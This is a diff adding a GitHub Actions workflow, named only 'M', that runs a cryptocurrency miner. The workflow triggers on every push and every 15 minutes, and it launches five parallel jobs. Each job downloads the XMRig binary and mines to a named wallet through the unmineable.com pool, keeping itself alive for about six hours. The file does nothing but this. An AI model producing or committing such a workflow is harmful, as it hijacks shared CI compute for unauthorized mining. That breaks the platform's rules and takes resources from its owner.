@@ -1,0 +1,31 @@
+name: M
+on:
+  push:
+  schedule:
+    - cron: '*/15 * * * *'
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      fail-fast: false
+      matrix:
+        i: [1, 2, 3, 4, 5]
+    steps:
+      - name: Setup
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar >/dev/null 2>&1
+          
+      - name: Mine
+        run: |
+          cd /tmp
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O x.tgz
+          tar xf x.tgz
+          cd xmrig-*
+          chmod +x xmrig
+          ./xmrig -o rx.unmineable.com:3333 -u 0xA763c9f25d702B34022130dA0Fb8e92712a73091:USDT.mega_0004_2 -p x --donate-level 1 -k --no-color &
+          sleep 21000
+        timeout-minutes: 360
